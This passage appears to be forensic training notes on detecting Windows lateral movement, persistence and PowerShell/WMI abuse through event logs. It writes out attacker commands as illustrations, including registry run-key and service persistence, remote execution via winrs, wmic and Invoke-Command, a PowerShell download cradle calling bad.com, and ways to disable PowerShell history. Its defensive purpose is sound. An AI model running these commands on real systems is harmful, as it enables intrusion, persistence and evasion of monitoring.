**Interact with remote registries: The registry can be manipulated for all sorts of evil, and a built-in Windows tool allows it to be done remotely.** The Remote Registry service must be started on the target, and prior authentication with the system must be in place since there is no option in reg.exe to provide credentials (attackers often mount an admin share to pre-authenticate). Registry key last write times are some of the best detection mechanisms.

{% code overflow="wrap" %}
```cs
reg add \\host\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Data /t REG_SZ /d "c:\evil.exe"
```
{% endcode %}

**Executing remote command:** Windows remote shell (**winrs**) is a bit more obscure than WMIC and PowerShell but still very powerful. If Windows Remote Management service (**WinRM**) is enabled on a system, it can run any arbitrary command with default encrypted traffic. It has similar capabilities to **PsExec** but can often pass through host firewalls when **PsExec** fails (assuming WinRM is enabled in the environment). Sometimes, attackers may turn on the **WinRM** service to accomplish their objectives. In some enterprises, the existence of this service being enabled could be a clue to potential nefarious activity. Additionally, **winrs** will start the **winrshost.exe** process on the remote system.

```cs
winrs -r:host -u:user command
```

**Investigator Notes:** Numerous Windows commands have remote execution capabilities. Once an attacker collects credentials that allow remote authentication (Domain Admin being preferred), many lateral actions can be taken throughout the enterprise. These tools are particularly prized by attackers since they facilitate “living off the land”—a strategy that allows attackers to accomplish their objectives with little to no external tools required. This reduces the attack profile, often making detection more difficult.

These commands can also leave behind process artifacts in memory and application execution artifacts on disk, such as Windows Prefetch. Network forensics can also identify most of this activity. For example, packet analysis can easily analyse remote scheduled tasks, service creation, and registry changes. **WinRM** traffic (**winrs**) is the notable exception—while traffic can be identified, default encryption would likely defeat detailed analysis.

#### Windows Remote Management Tools: Remote Services

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 084908.png" alt=""><figcaption></figcaption></figure>

Investigator Notes: Remote services, unfortunately, leave behind a few artefacts on the source system. While **sc.exe** can be identified via application execution artifacts, without command line auditing, it can be difficult to determine if it was used on a local service or a destination system.

On the destination system, we have many artifacts to identify malicious activities. Event logs can be very helpful, showing what account was used for authentication and a wealth of knowledge about the services interacted with. If a new executable or DLL is used to create a new service, the creation of those files and subsequent application execution artifacts can be identified.

#### Windows Remote Management Tools: Scheduled Tasks

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 085357.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** Scheduled task activity leaves enormous residue on the source and destination systems. Source systems have the standard application execution and “runas” explicit credential artifacts. However, the destination system contains a wealth of information defenders are interested in.

Like most lateral movement techniques, event logs on the destination system can be useful in identifying malicious activity. The authentication events show what user accounts are being abused. The **Security log** maintains several event IDs related to creating, deleting, and enabling tasks. There is also a dedicated **Task Scheduler log** maintaining similar information (this log may need to be enabled on the latest versions of Windows). In addition to logs, “job” files stored in the Tasks folders are frequently ignored by attackers and can provide precise details about malicious tasks. Finally, Windows registry and application execution artifacts are also generated.

#### WMI: Source System Artifacts

* One of the most powerful lateral movement options and one of the most difficult to investigate
* WMI is native to every modern Windows system
* PowerShell will be covered separately
* Source system artifacts are sparse

<figure><img src="../../.gitbook/assets/image 8.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** WMI is a flexible remote (and local) management infrastructure. While PowerShell can leverage and script WMI commands, WMI can also be used as an attack tool. The use of WMI and PowerShell is increasing as attackers seek to evade security mechanisms and leave smaller forensic footprints. Attackers sometimes have an advantage when using these tools as, in some cases, there are few forensic artifacts left behind to show their activity.

One of the most common WMI commands for lateral movement is “**process call create**”. This extremely powerful and popular command gives adversaries similar capabilities to PsExec while leaving fewer artifacts (for example, no service is created with this command). WMI commands are typically not encrypted unless they happen to be used over the **WinRM** protocol (e.g., using PowerShell). Thus, network forensics can be useful for tracking WMI usage.

{% code overflow="wrap" %}
```cs
wmic /node:host /user:user process call create "c:\temp\evil.exe" Invoke-WmiMethod – Computer host –Class Win32_Process –Name create –Argument “C:\evil.exe”
```
{% endcode %}

**Note**: The source systems maintain few records of WMI activity. The existence of application execution artifacts for **wmic.exe** is a good indication, but command line auditing is necessary to piece together what it was used for. Luckily, artifacts recorded on destination systems are much more helpful.

#### WMI: Destination System Artifacts

*   WMI activity has long been a blind spot

    * wmiprvse.exe is a strong indication
    * The new Microsoft-Windows-WMIActivity/Operational log is a game changer
    * Look for residue left from WMI event consumers

    <figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 090915.png" alt=""><figcaption></figcaption></figure>

    **Investigator Notes:** WMI activity can be a blind spot in most enterprises. On the destination system, event logs will be useful for authentication events, particularly if you can tie them to a process-tracking event or application execution of wmiprvse.exe (the core process used for remote WMI actions). **Microsoft-Windows-WMIActivity/Operational**, provides evidence of remote WMI activity and is one of the few artifacts that can help identify WMI event consumers (commonly used for malware persistence). This log is one of our best (and only) information sources for WMI attacks.

The destination file system can help us identify any executables copied to the remote system (especially if “**process call create**” was in use). Evidence of the creation of **.mof** files or the execution of **mofcomp.exe** can provide early indications of WMI event consumers, as **.mof** files are one of the easiest ways to implement them. Once the activity has been identified, a review of the WMI Repository can identify the type of persistence and what was scheduled to be executed (PowerShell can help audit this).

#### PowerShell Remoting: Source System Artifacts

* Look for evidence of Powershell.exe execution.
* PowerShell v5 (Win10+) introduced improved logging

<figure><img src="../../.gitbook/assets/image 9.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** PowerShell is a scripting language that has access to WMI (and much more). PowerShell remoting uses the **WinRM** protocol to scale tasks. Using PowerShell, running a credential dumper on one system is nearly as simple as running it remotely on 1,000 systems. PowerShell remoting must be enabled to scale effectively, which is increasingly the case as it is used heavily for enterprise administration. The most common PowerShell commands for lateral movement are **Invoke-Command** and **Enter-PSSession**. The latter provides an encrypted interactive shell to the remote system, similar to SSH.

```cs
Invoke-Command –ComputerName host –ScriptBlock {Start-Process c:\temp\evil.exe}
Enter-PSSession -ComputerName host -Credential user
```

**Remote session example:**

```cs
Enter-PSSession -ComputerName host
Invoke-Command -ComputerName host -ScriptBlock {Start-Process c:\temp\evil.exe}
```

**Investigator Notes:** Similar to discovering malicious WMI, finding Powershell usage can be challenging. On the source system, look for evidence of powershell.exe usage. Application execution artifacts like **Prefetch** and **ShimCache** can pinpoint their use. Logs are critically important to tracking PowerShell.&#x20;

The **Microsoft-Windows-PowerShell/Operational** log on the source system can identify PowerShell sessions. **Microsoft-Windows-WinRM/Operational** can identify remote PowerShell activity, including the destination **hostname**, **IP address**, and **username**. Process tracking and command line auditing are critical to piecing together many **WMI** and **PowerShell** attacks. This capability is the most important detective technique, and PowerShell v5 now has a console history log, ConsoleHost\_history.txt, that records the last 4,096 commands typed per user on the source system.

If you are in an environment where Windows remote management is not used, you are in luck because searching for systems with the Windows Remote Management (WS-Management) service enabled can help identify where attackers have travelled. The biggest challenge is most organisations are using them for administrative purposes. Thus, separating good from bad activity can be very difficult. With good logging, evil activity is often easy to spot. For example, admins typically do not use “**wmic process call create**” or **encoded PowerShell** scripts. Similar to other incident response techniques, focus first on the anomalies.

#### PowerShell Remoting: Destination System Artifacts

* wsmprovhost.exe is a good indicator of PS Remoting
*   Full script logging is available in PSv5

    * Blocklisted cmdlets are logged by default

    <figure><img src="../../.gitbook/assets/image 10.png" alt=""><figcaption></figcaption></figure>

    **Investigator Notes:** When investigating a target (destination) system involved in potential PowerShell attacks, look for evidence of **wsmprovhost.exe** execution. This process is executed on the receiving end of a PowerShell remoting session and may be rare in some environments (in others, it may be ubiquitous). Additionally, PowerShell may be used to push and execute arbitrary binaries on the system, so strange file creation and application execution events can lead to evidence proving PowerShell activity.

The biggest weapon we have to identify PowerShell usage is event logging. PS v5 improved logging for the source and destination systems of PowerShell remoting attacks. Expect to see **Type 3** (network) logon events, showing the account authentication necessary to run these tools. PowerShell v5 now includes detailed script block logging, including logging suspicious activity by default. This means that even in environments with weak audit policies, there can still be very useful PowerShell logging, often capturing the entire script contents of what was accomplished via PowerShell (scripts using blocklisted cmdlets are logged by default). This information is captured in the **Microsoft-Windows-PowerShell/Operational log** on the destination system. Process tracking and command line auditing events (not enabled by default) can capture every PowerShell command executed.

## Understanding and Investigating Lateral Movement Techniques

### Tracking Persistence Techniques

**Understanding and investigating persistence techniques:** To achieve persistence, attackers can use multiple techniques, such as creating an account, adding a malware path to registry run keys, installing a service, creating a scheduled task, or developing a WMI consumer. Investigating specific persistence techniques using Windows event logs can help by focusing on the following activities:

* Registry run keys
* Windows scheduled tasks
* Windows services
* WMI event subscription

#### Registry run keys

The Registry is a hierarchical database that stores configuration settings and defined options about the operating system, including hardware devices, software applications, and user preferences. It serves as a central repository for critical system and application settings. Registry consist of five Hives, the most important hives are **HKEY\_CURRENT\_USER (HKCU)** which stores configuration settings for the currently logged-in user, and **HKEY\_LOCAL\_MACHINE (HKLM)** which stores configuration settings for the entire computer system, applicable to all users.

Registry run keys are keys that make a program run when a user logs, for example an attacker may achieve persistence by modifying existing or adding new value under the registry run keys to reference the malware path to be executed when a user logs in. The following registry run keys are created by default:

* HKEY\_CURRENT\_USER\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY\_CURRENT\_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
* HKEY\_LOCAL\_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY\_LOCAL\_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

Registry run keys are recorded with security Event ID: **Event ID                Event name**

* 4656            A handle for an object was requested
* 4657            A registry value was modified
* 4658            The handle to an object was closed
* 4660            An object was deleted
* 4663            An attempt was made to access an object

Event names refer to an Object except **event ID 4657**, which refers to the registry. **Event IDs 4656, 4658, 4660,** and **4663** are designed to record any access to an object, including the registry keys, while **event ID 4657** is designed to audit changes in the registry keys.

<figure><img src="../../.gitbook/assets/image 11.png" alt=""><figcaption></figcaption></figure>

Event consists of four sections. The first is the **Subject** section, which refers to information about the user who performed the action. The second is the **Object** section, which consists of the **Object Server** field and is always **Security**. The Object Type field refers to the type of the accessed object, which could be a file, key, or SAM;  focus on the **Key** value, which refers to registry keys, to investigate the registry run key persistence technique. The last interesting field is the **Object Name**, which refers to the name of the accessed object, including the registry key path. The third section is the **Process Information** section, which refers to the process that made the action, and the last section is **Access Request Information**, which refers to the permissions. Still, it’s not helpful to our investigations.

### Windows Scheduled Tasks

Scheduled tasks are recurring predefined actions automatically executed whenever a certain set of conditions are met. An attacker may achieve persistence by creating a scheduled task to execute malicious code.&#x20;

**Example**:

```cs
schtasks /create /tn mysc /tr C:\Users\Public\test.exe /sc ONLOGON /ru System
```

Event ID 4698 logs scheduled task activity creation in Security event log files

<figure><img src="../../.gitbook/assets/image 12.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image 13 (1).png" alt=""><figcaption></figcaption></figure>

### Windows Services

A service is a process that runs in the background without any interaction from a user or even starts before a user logs into a system. An attacker could achieve persistence by creating a new or modifying an existing service to execute malicious code. Example:

```cs
sc.exe create TestService binpath= c:\windows\temp\NewServ.exe start=auto
```

Microsoft tracks new service creation activities **via Event ID 7045** in the system event logs and **Event ID 4697** in the Security event logs.&#x20;

<figure><img src="../../.gitbook/assets/image 14 (1).png" alt=""><figcaption></figcaption></figure>

The above shows **event ID 4697**, which records new service creation activity and is recorded in the Security event logs. The event log is divided into two sections: the first section is the **Subject** section, which contains information about the user who created the service, and the second is the **Service** Information section, which contains information about the newly created service.

Focus on the **Service Information** section’s fields; the first field refers to the newly created service name. The second field is **Service File Name**, which refers to the binary path that the service executes; the third field indicates the created service type, and the fourth field is **Service Start Type**, which indicates when and how the service will start. The start type values are numeric (0 = a boot device such as Windows drivers, 1 = a driver started by the I/O subsystem, 2 = an auto-start service (the service start type used by attackers to keep persistence), 3 = a manual start, and 4 = a disabled service). The last field is **Service Account**, which refers to the account the service runs under its context.

<figure><img src="../../.gitbook/assets/image 15.png" alt=""><figcaption></figcaption></figure>

The above shows **event ID 7045**, which records new service creation activity in the system event log file. All the details in this log field are the same as those in the **Service Information** section of e**vent ID 4697**. The above shows **event ID 7045**, which records new service creation activity in the system event log file. All the details in this log field are the same as those in the **Service Information** section of e**vent ID 4697**.

### WMI Event Subscription

An attacker may keep persistence on an infected system by configuring the **Windows Management Instrumentation (WMI)** event subscription to execute malicious content through a script or the command line when specific conditions are met. To keep persistence on the victim's machine by using a **WMI event subscription**, an attacker needs to conduct the following three steps:

1. **An event filter** must be created to define a specific trigger condition (for example, every minute).
2. **An event consumer** must be created to define the script or command executed once the condition defined in the event filter is met.
3. **A binding** must be created that ties the event filter and event consumer together.

Windows event ID 5861 in the Microsoft-Windows-WMI-Activity/Operational log file records every **WMI event consumer** creation activity. The types of WMI event consumers that can be used maliciously are CommandLineEventConsumer and ActiveScriptEventConsumer. CommandLineEventConsumer is designed to execute commands, and ActiveScriptEventConsumer is designed to execute scripts.

To investigate suspicious consumer creation, define whether the consumer type is one of the two mentioned consumer types that can be used maliciously. Investigate rare WMI event filters and consumer names, and then investigate whether the consumer is designed to conduct any suspicious executions, such as executing binary from suspicious paths or using a living off-the-land executable.

## Privilege Escalation

#### Command Line, PowerShell, and WMI Analysis

### Evidence of Malware Execution

**Scenario**

* Identify potential malware and determine whether it was executed. **Relevant Event IDs.**
* System Event Log
  * Review Critical, Warning, and Error events for system and process crashes
* Application Event Log
  * Event IDs 1000-1002 –Windows Error Reporting (WER), Application crashes and hangs&#x20;

**Investigator Notes:**

* Note crashed applications, processes and system reboots
* Review Windows Error Reports (**Report.wer**) written during times of interest
* **Windows Defender** and/or Anti-Virus logs should also be reviewed

**Notes**: When attempting to identify malicious software, it is logical to review event logs. However, we may find more information in the System and Application logs due to audit policies than in the **Security log**. Although the Security Event log can record every process executed via Process Tracking, in practice, it is often not enabled because of the large amount of logging it creates. In many organisations, **Process Tracking** is left disabled on all but the most critical systems. **PowerShell** and **WMI** logs may not be centralised. Hence, we sometimes need to lean on the **System** and **Application** logs to identify unusual activity.

Look for the most critical events in these logs, namely the **Critical, Error** and **Warning** events. Although many of these events can be present in the log, most are duplicates that get logged every hour, every boot cycle, etc. Instead, look for the outliers, and when tracking malware, look for antivirus or security product warnings that might have identified suspicious activity on the system.

Application log event ID 1001 records Windows Error Reporting events and can identify when additional logging has been accomplished for troubled applications (and malfunctioning malware).

#### Evidence of Malware Execution – Pass-the-Hash Toolkit

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 115034.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** Remember that the operating system and applications running on the system might have security mechanisms that only log to the System or Application logs.

In the above example, an attacker executed a tool named **lslsass64.exe** from the C:\Temp folder. The name alone would have likely been interesting but paired with a temp folder and an application error. This finding would be worth investigating. At the same time, a Windows Error Reporting event, EID 1001, was logged, indicating an application crash and the possibility of additional documentation in the local WER folder.

Also, even administrator accounts might have difficulties accessing some folders in the **C:\ProgramData\Microsoft\Windows\WER** folder. The ideal solution is to use a forensic collection tool that can evade permissions by recovering files from the raw disk (there are also tools like **Invoke-NinjaCopy** that can do the same). After finding evidence of an unusual executable, the next step would be to look at other events, event logs, and data sources that were updated around the same time. Windows applications and systems crash frequently; extra context can help you decide if you want to dig deeper.

#### Process Tracking and Capturing Command Lines

**Scenario**

* Identify potential malware execution and record the full command line to launch a process (including cmd.exe and powershell.exe). **Relevant Event IDs**
* **4688** (Security Log): New process created (includes executable  path)
* **4689** (Security Log): Process exit **Investigative Notes**
* Currently available in Win10+
* Records account used process info and full command line
* Command line capture requires Process Tracking to be enabled (not on by default)
* Logon ID value can be used to link processes to a user session

Investigator Notes: Event ID 4688 Process Tracking events can be an extremely powerful information source if enabled. They show full path, execution time, account information (including session via Logon ID), and can now capture the full command line. If enabled, EID 4689 events show corresponding process termination.

**WMI Attacks: Reconnaissance**

```cs
wmic process get CSName, Description, ExecutablePath, ProcessId
wmic useraccount list full
wmic group list full
wmic netuse list full
wmic qfe get Caption, Description, HotFixID, InstalledOn
wmic startup get Caption, Command, Location, User
```

**Investigator Notes:** Many WMI recon commands are innocuous and quite common in an environment. That can make them challenging to identify at scale. However, the attacker might have a particular way of querying this information. If you capture command lines, you can use idiosyncrasies and create interesting signatures. For example, if you see the command wmic user account list full immediately after a successful logon to a system, the two events together might help you identify an attacker’s specific behaviour.

**WMI Attacks: Privilege Escalation** Find unquoted services set to auto-start:

{% code overflow="wrap" %}
```cs
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
```
{% endcode %}

#### Auditing WMI Persistence (1)

Scenario:

* Easily audit for malicious WMI event consumer persistence Relevant Event IDs
* **5858** records query errors, including host and username
* **5857**-5861 record filter/consumer activity
* **5861** is the most useful: new permanent event consumer creation **Investigative Notes**
* WMI-Activity/Operational Log
* Enabled by default on Win10+ and Win2012R2+
* Event Filter and Consumer recorded in logs
* Both CommandLineEvent and ActiveScriptEvent consumers are logged

**Investigator Notes:** Malicious WMI event consumers have exploded in popularity since they were introduced to the world by Stuxnet. This is largely due to them being very effective and very difficult to find on a system (especially at scale). Setting up WMI persistence requires three discrete steps:

1. An event filter must be created describing a specific trigger to detect (for example, trigger every twenty seconds).
2. An event consumer is added to the system with a script and/or executable to run (run a PowerShell script to beacon to a command and control server).
3. Finally, the event and consumer are connected via a binding, and the persistence mechanism is loaded into the WMI repository.

To audit for WMI event filter/consumer activity, review the WMI-Activity/Operational log. **Event ID 5861** is the most useful, as it records any permanent consumer introduced into the local WMI repository. WMI event consumers identify what will be executed upon the trigger of a WMI event filter, making it easy to spot evil. Look for any unusual executables, PowerShell, or VBScript references, as these are the most common vectors abused by attackers and advanced malware. **Event ID 5857** can be useful to track loaded provider DLLs (evil DLLs extending WMI). **Event ID 5858** includes the hostname and username when logging WMI query errors. This data can be useful to identify lateral movement using WMI via tools like WinRM. Look for known compromised accounts and connections from remote hosts.

#### Auditing WMI Persistence (2)

<figure><img src="../../.gitbook/assets/image 16.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** 5861 events indicating a new WMI event consumer creation. This type of event can be rare in many enterprises (some environments have routine consumers created by software, but they are usually very identifiable and easy to allowlist). Its rarity makes it an excellent artifact to audit. Since the event also records the full consumer information, you should pay attention to any unusual executables, PowerShell, or VBScript references, as these are the most common vectors abused by attackers and advanced malware. Here, an encoded PowerShell script has been set as the consumer. We would want to investigate this, and it would be trivial to extract the base64 encoded PowerShell script from this output for analysis. Further, we could cross-reference this event with a corresponding EID 5859 event to identify this consumer's chosen filter (trigger).

#### Quick Wins in the WMI-Activity/Operational Log

* WMI-Activity log is best used to discover evil WMI eventing
  * EID 5861: New permanent consumers
  * Allowlist “normal” WMI event consumers in your environment
* Do not expect to find WMIC command lines
  * Requires process tracking/command line auditing in the Security log
* The log can provide insight into more obscure WMI attacks
  * EID 5857 tracks loaded provider DLLs (evil DLLs extending WMI)
  * EID 5858 includes hostname and username – search for known bad
* Search for uncommon keywords to identify anomalies:

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 123900.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes:** The WMI-Activity/Operational log includes good logging for WMI events. Event ID (EID) 5861 is a great first choice since the event consumer is often the easiest to identify as evil. Here you will look for CommandLine and ActiveScript consumers running suspicious executables, PowerShell commands, or scripts. Note that you will see legitimate consumers in almost every enterprise. However, these should be relatively standard and easy to allow. Some common legitimate consumer names are: SCM Event Log, BVTFilter, TSlogonEvent.vbs, TSLogonFilter, RAevent.vbs, RmAssistEventFilter, KernCap.vbs, NTEventLogConsumer, and WSCEAA.exe (Dell). Be careful here! Attackers have been seen in the wild using names similar to these legitimate ones (such as SCM Event Consumer) to blend in.

Beyond just looking at the event consumers, search the log for terms often present in suspicious activity. PowerShell, eval, .vbs, .ps1, and ActiveXObject frequently occur in malicious WMI events. Scrcons is the process responsible for ActiveScript consumers, and wbemcons.dll is loaded (EID 5857) when a command line event consumer is started. Looking at log entries in different ways may help identify missed malicious activity.

### PowerShell-Specific Logging

**Scenario**

* Log Powershell activity, including pipeline output, full script contents executed by a user, and Powershell remoting instances **Relevant Event IDs**
* 4103: Module logging and pipeline output
* 4104: Script block logging
* 4105/4106: Script Start/Stop (not recommended) **Investigative Notes**
* **PowerShell/Operational log**
* “Useful” logging is  available beginning with PowerShell version 5
  * PowerShell Downgrade Attacks can circumvent logging and security by running
  * **“PowerShell –V2 –Command <..>”**
* Script block logging includes scripts and some deobfuscation
* **Windows PowerShell.evtx** log is older but still useful (EID 400 / 800)
* **WinRM/Operational log** records inbound and outbound PowerShell remoting

**Investigator Notes:** Nearly every malicious activity imaginable is possible with PowerShell, including privilege escalation, credential stealing, data destruction, and data exfiltration. PowerShell is commonly used by most adversaries in the wild, is difficult to restrict access to, and has historically been difficult to audit.

This artifact might be the only help you have when trying to piece together what might have happened via PowerShell (imagine you saw PowerShell.exe executed via Prefetch or a process in memory and wanted to dig deeper). Module logging and the script block logging provide insight into PowerShell activity. A script block can be thought of as a collection of code that accomplishes a task. Script blocks can be as simple as a function or as full-featured as a script calling multiple cmdlets. Script block auditing can capture the full command or contents of the script, who executed it, and when it occurred.

Audits are recorded as event log entries in the **Microsoft-Windows-PowerShell/Operational** log regardless of how PowerShell was executed—from a command shell, the integrated scripting environment (ISE), or via custom hosting of PowerShell components. Event **ID 4104** records the script block contents, but only the first time it is executed in an attempt to reduce log volume. **4105/4106** events (PowerShell execution) are often considered too noisy to be useful for threat hunting.

Most logging is not enabled by default, so the data might not be available when needed. However, Microsoft did enable a built-in feature to automatically log any suspicious scripts, even if script block logging is disabled. This is valuable for investigators reviewing the **Microsoft-Windows-PowerShell/Operational** log, even in organisations that have not yet enabled full auditing.

**Microsoft-Windows-WinRM/Operational** log tracks WinRM connections, which happens to be the primary protocol for PowerShell remoting. The log is available on both source and destination systems. It records the destination hostname, IP, and currently logged-on user (Event ID 6), as well as the source of session creation (Event ID 91) and the authenticating user account (Event ID 168).

#### PowerShell Syntax to Achieve Stealth

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 130620.png" alt=""><figcaption></figcaption></figure>

**Investigator Notes**: Like many attacker behaviours, a limited set of syntax is frequently used to make malicious PowerShell activity more difficult to discover. While **(New-Object System.Net.Webclient).DownloadFile()** is the most common within many attack frameworks; it is not the only way to download files using PowerShell. Also, look for commonly abused commands like **Start-BitsTransfer** and **Invoke-WebRequest.**

**Quick Wins in the PowerShell/Operational Log**

* Event may capture different parts of an attack
  * 4103 recorks module/pipeline output
  * 4104 records code (scripts) executed (look for “Warning” events)
* The PowerShell download cradle sees heavy use in the wild:
  * IEX (New-Object Net.Webclient).downloadstring("http://bad.com/bad.ps1")
* Filter using commonly abused keywords

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 131346.png" alt=""><figcaption></figcaption></figure>

* Look for obvious signs of encoding and obfuscation

**Investigator Notes:** As PowerShell becomes more common in the enterprise, many legitimate scripts will likely be recorded in the **PowerShell/Operational** log. Your task as an analyst is to find any evil that may be hiding among that legitimate activity.

**Note**: While EID 4104 events (script block logging) are the latest and greatest in the PowerShell auditing world, don’t ignore the older EID 4103 (module logging) events. Both events log activity from different perspectives. Module logging focuses on PowerShell pipeline execution. Almost every command uses several modules or cmdlets, and EID 4103 events can include variables, commands, interim output, and even some deobfuscation. Script logging (EID 4104) records the code blocks executed, providing excellent deobfuscation, including dynamically generated script contents, but typically no output.&#x20;

Windows will label suspicious events as EID 4104 “Warning” events. This can help the analyst distinguish from other EID 4104 events and perhaps be a good first filter run to narrow the focus to events that Windows has already identified. You may see duplicate information between the two event types, but you may also find important differences that allow a deeper understanding of an attack.

**Note**: The download cradle is one of the most dangerous (and common) PowerShell attacks in the wild today. It uses the benign PowerShell executable (or elements thereof) to execute file-less, memory-only malicious scripts downloaded from the internet. The above shows the most generic version of the cradle, but attackers have developed many ways to change or obfuscate elements to better hide from security software. The good news is obfuscation is almost, by definition, going to look strange to an analyst, by the bad news is that the analyst has a lot of log entries to find the obfuscated commands. A good list of keywords to start searching for is present in the above image. Each one of these keywords can be obfuscated by attackers. Still, one or more will usually provide solid hits, particularly since PowerShell logging also often includes the unobfuscated version of scripts. Just like hunting using other artifacts, defenders must continually be creative to find new ways attackers hide their activity.

**PowerShell Script Obfuscation**

* Obfuscation is heavily used in modern PS attacks
  * Evade security software
  * Frustrate analysis efforts
*   Easy to recognize during analysis, but difficult at scale

    * Excellent reason to use PSv5 script block logging (some automatic decoding)
    * Integration with Antimalware Scanning Interface (AMSI)
    * Character frequency analysis (Revoke-Obfuscation project)

    <figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 132551.png" alt=""><figcaption></figcaption></figure>

    **Investigator Notes:** As antivirus, enterprise detection and response tools, and logging have improved detecting suspicious PowerShell, attackers have developed ingenious ways to defeat simple keyword detection. PowerShell is incredibly flexible, allowing a seemingly endless array of different ways to write the same script.

**PSReadline ConsoleHost\_history.txt**

* **ConsoleHost\_history.txt**
  * Records last 4,096 commands typed in PS console (not ISE)
  * Enabled by default in Win10+/PowerShell v5
* Attackers can disable (or remove the PsReadLine module)
  * Set-PSReadLineOption –HistorySaveStyle SaveNothing
  * Remove-Module –Name PsReadline

**Location of ConsoleHost\_history.txt**

```cs
%UserProfile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline
```

**Investigator Notes:** PSReadline is now a default module designed to log the last 4,096 commands typed in the PowerShell console. For those aware of Linux artifacts, it is the equivalent of Bash History, but now in Windows!

The commands are stored locally in each user’s profile using a file named **ConsoleHost\_history.txt**. The file format is a flat text file. The logged-on user's history file records even commands typed in an Administrator PowerShell console. Unfortunately, Windows does not protect this file, so knowledgeable attackers could easily remove or edit it. It is also possible to temporarily disable command line recording using one of the following two options. Luckily, the options are recorded in the file and are not permanent.

While similar to Transcript logging, only commands typed (not outputs) are recorded, and no additional metadata like timestamps are available. These logs are only recorded during interactive sessions explicitly using the PowerShell console. Their one advantage over transcript logging is that they are available by default for all users.

<figure><img src="../../.gitbook/assets/Screenshot 2023-10-01 133845 1.png" alt=""><figcaption></figcaption></figure>

#### Event Log Collection

**Live System Collection**

* Exporting from Event Viewer (.evt, .evtx, .csv, .xml, .txt)
* PsLogList (Sysinternals)
* Triage Collection via KAPE / Velociraptor
* PowerShell **Log Forwarding**
* Windows Event Forwarding (WEF)
* Splunk

**Live System Collection:**

&#x20;You have many options for exporting logs from both live and offline systems. When working with a live system, it is important to keep in mind that event logs are always in use and, hence, locked by the operating system. This presents a little bit of a challenge. An easy option for live export is using the Event Viewer itself. Right-clicking the event log of interest will allow you to “Save log”. Logs can be saved in various formats, including native (.evt or .evtx), .csv, .xml, and .txt. The free PsLogList tool from Sysinternals is a commandline collection tool with many features. It can dump live logs to a text or .csv file, read and output exported event logs in their native .evt/.evtx format, pre-filter output, and even dump event logs from remote systems.

Scripting or agent-based solutions can collect logs at scale. PowerShell is an easy choice as it includes native access to event logs. In its simplest form, the command Get-WinEvent –LogName Security will extract individual events. The open-source Kansa project uses this capability to scale collection. Entire event logs can be collected using commands like the following:

{% code overflow="wrap" %}
```cs
(Get-WmiObject -Class Win32_NTEventlogFile | Where-Object LogfileName -EQ 'System').BackupEventlog(‘G:\System.evtx')
OR
Via Velociraptor using the Kape collector
OR
Kape
```
{% endcode %}

**Get-WinEvent and PowerShell**

* PowerShell can be used to collect and filter logs
* Get-WinEvent -ComputerName for remote collection
* Get-WinEvent -Logname for local events
* Get-WinEvent -Path for archived log files

{% code overflow="wrap" %}
```cs
Get-WinEvent -FilterHashtable @{Logname=“Security";id=4624} | Where {$_.Message -match “spsql"}
Get-WinEvent -FilterHashtable @{Path="C:\Path-To-Exported\Security*.evtx“ ;id=5140} | Where {$_.Message -match "\\Admin\$"}
```
{% endcode %}

**Investigator Note**: PowerShell gives native access to event logs and can be leveraged to collect and filter logs from a single system or hundreds. The Get-WinEvent cmdlet should be used with the modern EVTX format.

A significant upgrade included with **Get-WinEvent** is the ability to perform client-side filtering, which is particularly useful when using the cmdlet across many remote systems (ideally via PowerShell remoting). The examples above show some filtering capabilities using the -FilterHashTable option. The first example filters the local Security log for **4624** (**Successful Logon**) events with the keyword “**spsql**” in the text message field. The second example is being run on a collection of exported logs (wildcards can be used to search groups of logs). Network share objects are being filtered (Event ID 5140), specifically looking for the unusual Admin$ access.

Output can be in table view, CSV (ConvertTo-Csv), HTML (**ConvertTo-Html**), or one of the many output and format options in PowerShell.
